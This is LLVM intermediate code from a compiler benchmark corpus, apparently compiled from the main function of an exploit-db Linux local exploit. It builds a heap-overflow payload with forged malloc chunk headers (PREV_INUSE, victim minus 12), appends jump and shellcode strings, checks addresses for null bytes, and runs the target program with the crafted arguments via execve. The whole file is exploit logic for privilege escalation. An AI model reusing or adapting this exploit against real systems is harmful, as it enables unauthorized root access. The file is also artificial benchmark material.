; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_178.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_178.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@filename = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [3 x i8] c"-g\00", align 1
@.str.1 = private unnamed_addr constant [4 x i8] c"123\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"AAAABBBBCCCCDDDDEEEE\00", align 1
@stack = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [5 x i8] c"AAAA\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"X\00", align 1
@PREV_INUSE = common dso_local global i32 0, align 4
@victim = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [41 x i8] c"Null byte(s) in `victim - 12' (0x%08x)!\0A\00", align 1
@p = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [20 x i8] c"0x42.0x42.0x42.0x42\00", align 1
@.str.7 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.8 = private unnamed_addr constant [34 x i8] c"Null byte(s) in `host' (0x%08x)!\0A\00", align 1
@.str.9 = private unnamed_addr constant [28 x i8] c"0x%02x.0x%02x.0x%02x.0x%02x\00", align 1
@jmp = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@program = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [37 x i8] c"Null byte(s) in `gateway' (0x%08x)!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [1337 x i8], align 16
  %3 = alloca [1337 x i8], align 16
  %4 = alloca [7 x i8*], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %9 = getelementptr inbounds [7 x i8*], [7 x i8*]* %4, i64 0, i64 0
  %10 = load i8*, i8** @filename, align 8
  store i8* %10, i8** %9, align 8
  %11 = getelementptr inbounds i8*, i8** %9, i64 1
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8** %11, align 8
  %12 = getelementptr inbounds i8*, i8** %11, i64 1
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0), i8** %12, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 1
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8** %13, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 1
  %15 = getelementptr inbounds [1337 x i8], [1337 x i8]* %2, i64 0, i64 0
  store i8* %15, i8** %14, align 8
  %16 = getelementptr inbounds i8*, i8** %14, i64 1
  %17 = getelementptr inbounds [1337 x i8], [1337 x i8]* %3, i64 0, i64 0
  store i8* %17, i8** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %16, i64 1
  store i8* null, i8** %18, align 8
  %19 = getelementptr inbounds [1337 x i8], [1337 x i8]* %3, i64 0, i64 0
  %20 = call i32 @strcpy(i8* %19, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  %21 = load i32, i32* @stack, align 4
  %22 = load i8*, i8** @filename, align 8
  %23 = call i32 @strlen(i8* %22)
  %24 = add nsw i32 %23, 1
  %25 = sub nsw i32 %21, %24
  %26 = getelementptr inbounds [1337 x i8], [1337 x i8]* %3, i64 0, i64 0
  %27 = call i32 @strlen(i8* %26)
  %28 = add nsw i32 %27, 1
  %29 = sub nsw i32 %25, %28
  %30 = call i32 @strlen(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %31 = add nsw i32 %29, %30
  store i32 %31, i32* %5, align 4
  store i32 0, i32* %6, align 4
  br label %32

32:                                               ; preds = %42, %0
  %33 = load i32, i32* %6, align 4
  %34 = load i32, i32* %5, align 4
  %35 = load i32, i32* %5, align 4
  %36 = and i32 %35, -4
  %37 = sub i32 %34, %36
  %38 = icmp ult i32 %33, %37
  br i1 %38, label %39, label %45

39:                                               ; preds = %32
  %40 = getelementptr inbounds [1337 x i8], [1337 x i8]* %3, i64 0, i64 0
  %41 = call i32 @strcat(i8* %40, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  br label %42

42:                                               ; preds = %39
  %43 = load i32, i32* %6, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %6, align 4
  br label %32

45:                                               ; preds = %32
  %46 = load i32, i32* %5, align 4
  %47 = and i32 %46, -4
  store i32 %47, i32* %5, align 4
  %48 = load i32, i32* @PREV_INUSE, align 4
  %49 = xor i32 %48, -1
  %50 = and i32 -1, %49
  %51 = getelementptr inbounds [1337 x i8], [1337 x i8]* %3, i64 0, i64 0
  %52 = bitcast i8* %51 to i32*
  %53 = getelementptr inbounds i32, i32* %52, i64 1
  store i32 %50, i32* %53, align 4
  %54 = getelementptr inbounds [1337 x i8], [1337 x i8]* %3, i64 0, i64 0
  %55 = bitcast i8* %54 to i32*
  %56 = getelementptr inbounds i32, i32* %55, i64 2
  store i32 -1, i32* %56, align 8
  %57 = load i32, i32* @victim, align 4
  %58 = sub nsw i32 %57, 12
  %59 = call i64 @zero(i32 %58)
  %60 = icmp ne i64 %59, 0
  br i1 %60, label %61, label %66

61:                                               ; preds = %45
  %62 = load i32, i32* @stderr, align 4
  %63 = load i32, i32* @victim, align 4
  %64 = sub nsw i32 %63, 12
  %65 = call i32 @fprintf(i32 %62, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.5, i64 0, i64 0), i32 %64)
  store i32 -1, i32* %1, align 4
  br label %184

66:                                               ; preds = %45
  %67 = load i32, i32* @victim, align 4
  %68 = sub nsw i32 %67, 12
  %69 = getelementptr inbounds [1337 x i8], [1337 x i8]* %3, i64 0, i64 0
  %70 = bitcast i8* %69 to i32*
  %71 = getelementptr inbounds i32, i32* %70, i64 3
  store i32 %68, i32* %71, align 4
  %72 = load i32, i32* @p, align 4
  %73 = call i32 @strlen(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0))
  %74 = add nsw i32 %73, 1
  %75 = add nsw i32 %72, %74
  %76 = call i32 @strlen(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  %77 = add nsw i32 %75, %76
  %78 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  %79 = add nsw i32 %77, %78
  store i32 %79, i32* %7, align 4
  %80 = load i32, i32* %7, align 4
  %81 = call i64 @zero(i32 %80)
  %82 = icmp ne i64 %81, 0
  br i1 %82, label %83, label %87

83:                                               ; preds = %66
  %84 = load i32, i32* @stderr, align 4
  %85 = load i32, i32* %7, align 4
  %86 = call i32 @fprintf(i32 %84, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.8, i64 0, i64 0), i32 %85)
  store i32 -1, i32* %1, align 4
  br label %184

87:                                               ; preds = %66
  %88 = load i32, i32* %7, align 4
  %89 = getelementptr inbounds [1337 x i8], [1337 x i8]* %3, i64 0, i64 0
  %90 = bitcast i8* %89 to i32*
  %91 = getelementptr inbounds i32, i32* %90, i64 4
  store i32 %88, i32* %91, align 16
  %92 = load i32, i32* %5, align 4
  %93 = load i32, i32* @p, align 4
  %94 = sub nsw i32 %93, 4
  %95 = sub i32 %92, %94
  store i32 %95, i32* %8, align 4
  %96 = load i32, i32* %8, align 4
  %97 = load i32, i32* @PREV_INUSE, align 4
  %98 = or i32 %96, %97
  store i32 %98, i32* %8, align 4
  %99 = getelementptr inbounds [1337 x i8], [1337 x i8]* %2, i64 0, i64 0
  %100 = bitcast i32* %8 to i8*
  %101 = getelementptr inbounds i8, i8* %100, i64 0
  %102 = load i8, i8* %101, align 4
  %103 = bitcast i32* %8 to i8*
  %104 = getelementptr inbounds i8, i8* %103, i64 1
  %105 = load i8, i8* %104, align 1
  %106 = bitcast i32* %8 to i8*
  %107 = getelementptr inbounds i8, i8* %106, i64 2
  %108 = load i8, i8* %107, align 2
  %109 = bitcast i32* %8 to i8*
  %110 = getelementptr inbounds i8, i8* %109, i64 3
  %111 = load i8, i8* %110, align 1
  %112 = call i32 @sprintf(i8* %99, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.9, i64 0, i64 0), i8 zeroext %102, i8 zeroext %105, i8 zeroext %108, i8 zeroext %111)
  %113 = getelementptr inbounds [1337 x i8], [1337 x i8]* %2, i64 0, i64 0
  %114 = call i32 @strcat(i8* %113, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  %115 = getelementptr inbounds [1337 x i8], [1337 x i8]* %2, i64 0, i64 0
  %116 = load i8*, i8** @jmp, align 8
  %117 = call i32 @strcat(i8* %115, i8* %116)
  %118 = getelementptr inbounds [1337 x i8], [1337 x i8]* %2, i64 0, i64 0
  %119 = load i8*, i8** @shellcode, align 8
  %120 = call i32 @strcat(i8* %118, i8* %119)
  %121 = getelementptr inbounds [1337 x i8], [1337 x i8]* %2, i64 0, i64 0
  %122 = load i8*, i8** @program, align 8
  %123 = call i32 @strcat(i8* %121, i8* %122)
  %124 = load i8*, i8** @jmp, align 8
  %125 = call i32 @strlen(i8* %124)
  %126 = load i8*, i8** @shellcode, align 8
  %127 = call i32 @strlen(i8* %126)
  %128 = add nsw i32 %125, %127
  %129 = load i32, i32* %7, align 4
  %130 = add i32 %129, %128
  store i32 %130, i32* %7, align 4
  %131 = load i32, i32* %7, align 4
  %132 = call i64 @zero(i32 %131)
  %133 = icmp ne i64 %132, 0
  br i1 %133, label %134, label %138

134:                                              ; preds = %87
  %135 = load i32, i32* @stderr, align 4
  %136 = load i32, i32* %7, align 4
  %137 = call i32 @fprintf(i32 %135, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.10, i64 0, i64 0), i32 %136)
  store i32 -1, i32* %1, align 4
  br label %184

138:                                              ; preds = %87
  %139 = load i32, i32* %7, align 4
  %140 = getelementptr inbounds [1337 x i8], [1337 x i8]* %2, i64 0, i64 0
  %141 = call i32 @strlen(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i8, i8* %140, i64 %142
  %144 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8, i8* %143, i64 %145
  %147 = load i8*, i8** @jmp, align 8
  %148 = call i32 @strlen(i8* %147)
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds i8, i8* %146, i64 %149
  %151 = getelementptr inbounds i8, i8* %150, i64 7
  %152 = bitcast i8* %151 to i32*
  store i32 %139, i32* %152, align 4
  %153 = load i8*, i8** @program, align 8
  %154 = call i32 @strlen(i8* %153)
  %155 = add nsw i32 %154, 1
  %156 = load i32, i32* %7, align 4
  %157 = add i32 %156, %155
  store i32 %157, i32* %7, align 4
  %158 = load i32, i32* %7, align 4
  %159 = call i64 @zero(i32 %158)
  %160 = icmp ne i64 %159, 0
  br i1 %160, label %161, label %165

161:                                              ; preds = %138
  %162 = load i32, i32* @stderr, align 4
  %163 = load i32, i32* %7, align 4
  %164 = call i32 @fprintf(i32 %162, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.10, i64 0, i64 0), i32 %163)
  store i32 -1, i32* %1, align 4
  br label %184

165:                                              ; preds = %138
  %166 = load i32, i32* %7, align 4
  %167 = getelementptr inbounds [1337 x i8], [1337 x i8]* %2, i64 0, i64 0
  %168 = call i32 @strlen(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds i8, i8* %167, i64 %169
  %171 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds i8, i8* %170, i64 %172
  %174 = load i8*, i8** @jmp, align 8
  %175 = call i32 @strlen(i8* %174)
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds i8, i8* %173, i64 %176
  %178 = getelementptr inbounds i8, i8* %177, i64 12
  %179 = bitcast i8* %178 to i32*
  store i32 %166, i32* %179, align 4
  %180 = getelementptr inbounds [7 x i8*], [7 x i8*]* %4, i64 0, i64 0
  %181 = load i8*, i8** %180, align 16
  %182 = getelementptr inbounds [7 x i8*], [7 x i8*]* %4, i64 0, i64 0
  %183 = call i32 @execve(i8* %181, i8** %182, i32* null)
  store i32 -1, i32* %1, align 4
  br label %184

184:                                              ; preds = %165, %161, %134, %83, %61
  %185 = load i32, i32* %1, align 4
  ret i32 %185
}

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i64 @zero(i32) #1

declare dso_local i32 @fprintf(i32, i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext) #1

declare dso_local i32 @execve(i8*, i8**, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
